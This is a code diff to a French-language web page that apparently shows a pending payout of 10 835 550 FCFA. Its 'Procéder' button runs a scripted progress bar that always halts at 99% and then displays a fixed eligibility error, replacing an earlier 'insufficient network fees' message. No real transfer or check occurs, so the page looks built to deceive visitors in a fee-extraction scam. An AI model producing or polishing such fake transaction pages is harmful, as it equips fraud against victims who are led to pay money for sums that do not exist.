@@ -88,11 +88,12 @@
             display: none;
         }
 
-        .error-message {
-            color: red;
+        .notification-message {
+            color: orange;
             font-size: 14px;
             margin-top: 10px;
             display: none;
+            font-weight: bold;
         }
 
         button {
@@ -129,7 +130,7 @@
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="7 559 000" disabled>
+                <input type="text" id="amount" class="amount" value="10 835 550 FCFA" disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -141,7 +142,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="error-message" id="errorMessage">Erreur : frais de réseau insuffisants.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Le compte n'est pas éligible pour recevoir la somme de 10 835 550 FCFA.</div>
         </form>
     </div>
 
@@ -149,20 +150,20 @@
         function startProgress() {
             document.getElementById('progressContainer').style.display = 'block';
             document.getElementById('progressTitle').style.display = 'block';
-            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('notificationMessage').style.display = 'none';
 
             let progress = 0;
             const progressBar = document.getElementById('progressBar');
             const progressPercentage = document.getElementById('progressPercentage');
             
             const interval = setInterval(() => {
-                if (progress < 91) {
+                if (progress < 99) {
                     progress += 1;
                     progressBar.style.width = progress + '%';
                     progressPercentage.textContent = progress + '%';
                 } else {
                     clearInterval(interval);
-                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('notificationMessage').style.display = 'block';
                 }
             }, 300);
         }
